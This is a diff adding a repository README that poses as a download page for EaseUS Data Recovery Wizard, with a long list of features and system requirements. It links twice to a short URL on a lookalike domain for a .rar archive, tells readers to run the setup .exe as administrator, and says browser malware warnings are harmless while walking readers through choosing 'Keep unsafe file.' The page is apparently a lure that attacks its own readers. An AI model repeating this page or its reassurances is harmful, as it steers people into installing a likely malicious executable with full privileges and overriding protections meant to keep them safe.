@@ -1,0 +1,259 @@
+                                                                                                                                        
+▀███▀▀▀███                       ▀███▀   ▀███▀▄█▀▀▀█▄█   ▀███▀▀▀██▄                                                               
+  ██    ▀█                        ██       █ ▄██    ▀█     ██   ▀██▄                                                              
+  ██   █   ▄█▀██▄  ▄██▀███ ▄▄█▀██ ██       █ ▀███▄         ██   ▄██   ▄▄█▀██ ▄██▀██  ▄██▀██▄▀██▀   ▀██▀  ▄▄█▀██▀███▄███▀██▀   ▀██▀
+  ██████  ██   ██  ██   ▀▀▄█▀   ████       █   ▀█████▄     ███████   ▄█▀   ███▀  ██ ██▀   ▀██ ██   ▄█   ▄█▀   ██ ██▀ ▀▀  ██   ▄█  
+  ██   █  ▄▄█████  ▀█████▄██▀▀▀▀▀▀██       █ ▄     ▀██     ██  ██▄   ██▀▀▀▀▀▀█      ██     ██  ██ ▄█    ██▀▀▀▀▀▀ ██       ██ ▄█   
+  ██     ▄██   ██  █▄   ████▄    ▄██▄     ▄█ ██     ██     ██   ▀██▄ ██▄    ▄█▄    ▄██▄   ▄██   ███     ██▄    ▄ ██        ███    
+▄██████████████▀██▄██████▀ ▀█████▀ ▀██████▀▀ █▀█████▀    ▄████▄ ▄███▄ ▀█████▀█████▀  ▀█████▀     █       ▀█████▀████▄      ▄█     
+                                                                                                                         ▄█       
+                                                                                                                       ██▀        
+
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                     EASEUS DATA RECOVERY WIZARD                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+EASEUS DATA RECOVERY WIZARD — is a professional data recovery solution that helps you recover lost or deleted files from various storage devices. Whether you've accidentally deleted important documents, formatted a drive, experienced a system crash, or lost data due to virus attacks, this powerful tool can restore your files with just a few clicks. With advanced scanning algorithms and support for 1000+ file formats, it's the go-to solution for both home users and IT professionals needing to recover precious data.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/FJzk7qjU                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  EaseUS_Recovery.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  EaseUS_Setup.exe (as administrator)
+    [4] FOLLOW      →  Installation wizard instructions
+    [5] LAUNCH      →  Data Recovery Wizard
+    [6] START       →  Scanning your drives
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    EaseUS Data Recovery Wizard utilizes advanced data recovery algorithms that scan storage devices at the deepest level to locate and reconstruct lost files. When a file is deleted, the operating system typically only removes the file's reference (pointer) while the actual data remains on the drive until overwritten. The software works by bypassing the file system and reading raw data directly from the storage medium, identifying file signatures, and rebuilding the original files .
+    
+    🔹 RECOVERY PROCESS
+    The program follows a sophisticated three-phase scanning approach:
+    
+    • QUICK SCAN: Rapidly scans the file system for recently deleted files by examining the Master File Table (MFT) and directory structures. This recovers files that were deleted but whose data hasn't been overwritten .
+    
+    • DEEP SCAN: Performs a comprehensive sector-by-sector analysis of the entire storage device, searching for file signatures (headers and footers) of known file types. This can recover files even after formatting, partition loss, or when the file system is damaged .
+    
+    • RAW RECOVERY: Advanced mode that recovers files based on their unique signatures without relying on file system information. Essential for severely corrupted drives or unrecognized partitions .
+    
+    🔹 SUPPORTED STORAGE DEVICES
+    The software works with virtually any storage medium:
+    
+    • HARD DRIVES: Internal and external HDDs (SATA, IDE, SCSI, etc.)
+    • SSDS: All solid-state drives including NVMe and M.2
+    • USB DRIVES: Flash drives, thumb drives, pen drives
+    • MEMORY CARDS: SD, microSD, CF, XD, MMC, Memory Stick
+    • DIGITAL DEVICES: Cameras, camcorders, music players
+    • OPTICAL MEDIA: CDs, DVDs, Blu-ray discs (non-scratched)
+    • RAID ARRAYS: RAID 0, 1, 5, 10 (with proper configuration)
+    • VIRTUAL DRIVES: VMware, VirtualBox, Hyper-V virtual disks
+    
+    🔹 FILE FORMAT SUPPORT
+    Recovers 1000+ file types including:
+    
+    • DOCUMENTS: DOC/DOCX, XLS/XLSX, PPT/PPTX, PDF, TXT, RTF
+    • IMAGES: JPG/JPEG, PNG, GIF, BMP, TIFF, RAW, CR2, NEF, ARW
+    • VIDEOS: MP4, AVI, MOV, MKV, WMV, FLV, 3GP, MTS, MXF
+    • AUDIO: MP3, WAV, WMA, AAC, FLAC, OGG, M4A
+    • ARCHIVES: ZIP, RAR, 7Z, TAR, GZ, ISO
+    • EMAILS: PST, OST, DBX, EML, MSG
+    • DATABASES: MDB, ACCDB, SQL, MDF, NDF
+    • CODE: HTML, CSS, JS, PHP, PY, JAVA, CPP, CS
+    
+    🔹 RECOVERY SCENARIOS
+    The software handles numerous data loss situations:
+    
+    • ACCIDENTAL DELETION: Files deleted normally or via Shift+Del
+    • RECYCLE BIN EMPTY: Files removed from Recycle Bin
+    • FORMATTED DRIVES: Recovery after quick or full format
+    • PARTITION LOSS: Lost partitions due to repartitioning or errors
+    • SYSTEM CRASH: Recovery from non-booting Windows systems
+    • VIRUS ATTACKS: Files deleted or hidden by malware
+    • POWER FAILURE: Data loss during unexpected shutdowns
+    • RAW DRIVES: Drives showing as RAW file system
+    • DISK CORRUPTION: Damaged file systems or bad sectors
+    • RESET/REINSTALL: Data lost during Windows reset or reinstallation
+    
+    🔹 USER INTERFACE
+    
+    • WIZARD-BASED: Step-by-step guidance for first-time users
+    • PREVIEW FUNCTION: Preview recoverable files before saving
+    • FILTER OPTIONS: Filter by file type, date, size, or name
+    • SEARCH FUNCTION: Find specific files quickly
+    • PROGRESS TRACKING: Real-time scan progress visualization
+    • PAUSE/RESUME: Pause long scans and resume later
+    • DARK MODE: Eye-friendly interface for late-night recovery
+    
+    🔹 PREVIEW CAPABILITIES
+    One of the most powerful features is the ability to preview files before recovery:
+    
+    • IMAGE PREVIEW: Thumbnail and full-size preview of photos
+    • VIDEO PREVIEW: Play videos to verify they're intact
+    • DOCUMENT PREVIEW: View text documents, spreadsheets, PDFs
+    • AUDIO PREVIEW: Listen to audio files before recovery
+    • ARCHIVE PREVIEW: See contents of ZIP/RAR files
+    • QUALITY INDICATOR: Shows expected recovery quality (Excellent/Good/Poor)
+    
+    🔹 ADVANCED FEATURES
+    
+    • BOOTABLE MEDIA: Create emergency bootable USB/DVD to recover unbootable systems
+    • DISK IMAGING: Create sector-by-sector backup of failing drives before recovery
+    • CUSTOM SCAN: Scan specific folders or file types only
+    • HEXADECIMAL VIEW: Advanced view for technicians and forensic users
+    • VIRTUAL DRIVE SUPPORT: Mount and recover from virtual disk images
+    • REMOTE RECOVERY: Recover data from remote computers over network
+    • COMMAND LINE: Command-line interface for automation and scripting
+    
+    🔹 RECOVERY FROM SPECIFIC SITUATIONS
+    
+    📂 FORMATTED DRIVES
+    Recovers files after accidental or intentional formatting. The software can rebuild the file system structure and recover data even after a full format .
+    
+    📂 DELETED PARTITIONS
+    When partitions are deleted or lost, the software scans the entire disk for partition information and can recover both the partition and its data .
+    
+    📂 RAW DRIVES
+    Drives that show as "RAW" in Disk Management have corrupted file systems. EaseUS can recover files directly from RAW drives without repairing the file system .
+    
+    📂 CORRUPTED FILES
+    For partially damaged files, the software can recover and repair corrupted photos, videos, and documents using built-in repair algorithms .
+    
+    🔹 DISK IMAGING
+    Create complete disk images for safe recovery:
+    
+    • SECTOR-BY-SECTOR COPY: Exact replica of entire drive
+    • COMPRESSED IMAGES: Save space with image compression
+    • SPLIT IMAGES: Split large images across multiple files
+    • MOUNT IMAGES: Work with images as virtual drives
+    • SCHEDULED BACKUPS: Automatic disk imaging on schedule
+    
+    🔹 BOOTABLE RECOVERY ENVIRONMENT
+    For systems that won't boot:
+    
+    • CREATION TOOL: Built-in tool to create bootable USB/DVD
+    • WINPE BASED: Uses Windows Preinstallation Environment
+    • NETWORK SUPPORT: Access network drives from recovery environment
+    • DRIVER INJECTION: Add custom drivers for RAID controllers
+    • FULL FUNCTIONALITY: All recovery features available in boot mode
+    
+    🔹 FILTERING AND SEARCH
+    Efficiently find specific files among thousands:
+    
+    • FILE TYPE FILTER: Show only documents, images, videos, etc.
+    • DATE RANGE: Filter by creation/modification date
+    • FILE SIZE: Find files larger/smaller than specified size
+    • NAME SEARCH: Search by filename or partial name
+    • TAG FILTERING: Filter by file tags and attributes
+    
+    🔹 RECOVERY PREVIEW
+    Preview capabilities before purchase/saving:
+    
+    • FREE PREVIEW: All files can be previewed without license
+    • BATCH PREVIEW: Preview multiple files at once
+    • METADATA VIEW: See file metadata and recovery probability
+    • SAMPLE RECOVERY: Recover small files for testing (limited in free version)
+    
+    🔹 ADDITIONAL TOOLS
+    
+    • PARTITION RECOVERY: Separate tool for recovering lost partitions
+    • PHOTO RECOVERY: Specialized tool optimized for photo recovery
+    • VIDEO REPAIR: Repair corrupted or damaged video files
+    • FILE SHREDDER: Permanently delete sensitive files (prevents recovery)
+    • DISK COPY: Clone drives sector by sector
+    • SYSTEM BACKUP: Backup and restore Windows system
+    
+    🔹 ENTERPRISE FEATURES
+    For business and professional use:
+    
+    • TECHNICIAN LICENSE: Recover data on multiple computers
+    • COMMAND LINE: Automated recovery with scripts
+    • NETWORK DEPLOYMENT: Install across multiple machines
+    • PRIORITY SUPPORT: Dedicated technical support for businesses
+    • AUDIT LOGS: Detailed logs for compliance and tracking
+    
+    🔹 RECOVERY SUCCESS RATE
+    The software achieves high success rates through:
+    
+    • MULTIPLE ALGORITHMS: Different recovery methods for different scenarios
+    • FILE SIGNATURE DATABASE: Extensive database of file signatures
+    • SMART SCANNING: Intelligent sector analysis prioritizes important areas
+    • ERROR HANDLING: Graceful handling of bad sectors and read errors
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7/8/10/11, Windows Server (all versions)
+    RAM             │ 1GB minimum (2GB+ recommended)
+    CPU             │ Intel/AMD processor, 1GHz or faster
+    STORAGE         │ 100MB for installation + space for recovered files
+    DISPLAY         │ 1024×768 or higher resolution
+    ADMIN RIGHTS    │ Required for deep disk access
+    INTERNET        │ Required for activation and updates
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    data recovery        │ file recovery         │ recover deleted files
+    easeus recovery      │ data recovery wizard  │ hard drive recovery
+    photo recovery       │ video recovery        │ document recovery
+    format recovery      │ partition recovery    │ usb recovery
+    sd card recovery     │ raw drive recovery    │ deleted file recovery
+    windows recovery     │ free data recovery    │ easeus wizard
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar system utility software receives the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/FJzk7qjU                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party distribution package. EaseUS Data Recovery Wizard is a commercial product of EaseUS Software. The free version allows recovery of up to 2GB of data. For unlimited recovery, a license key is required. Data recovery success depends on the condition of the storage device and whether data has been overwritten. The software is provided "as is" without guarantee of complete recovery. Users should stop using the affected drive immediately to maximize recovery chances.
+────────────────────────────────────────────────────────────────────────────
